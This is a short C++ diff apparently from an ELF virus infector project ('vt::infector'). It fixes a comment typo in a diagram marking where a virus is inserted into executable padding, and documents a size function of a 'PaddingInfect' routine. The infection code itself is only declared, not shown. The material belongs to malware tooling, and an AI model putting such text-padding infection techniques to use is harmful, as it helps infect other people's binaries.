@@ -15,7 +15,7 @@ namespace vt::infector {
 //  -------------------           -----------------------
 //  elf_hdr                       elf_hdr
 //  phdrs                         phdrs
-//  executale_sections            executale_sections  
+//  executable_sections           executable_sections
 //  padding                       padding             <- virus inserted here
 //  non-exec sections             non-exec sections
 //  shdrs                         shdrs
@@ -38,7 +38,12 @@ bool padding_infect64(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                       common::Mmap<PROT_READ> parasite_mapping);
 
 struct PaddingInfect {
+  // The output binary size of this algorithm.
+  // @param host_size Host binary size.
+  // @param parasite_size Parasite program size.
   static size_t output_size(size_t host_size, size_t parasite_size) {
+    // The text padding injection algorithm does'n change the host size.
+    (void)parasite_size;
     return host_size;
   }
   bool operator()(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
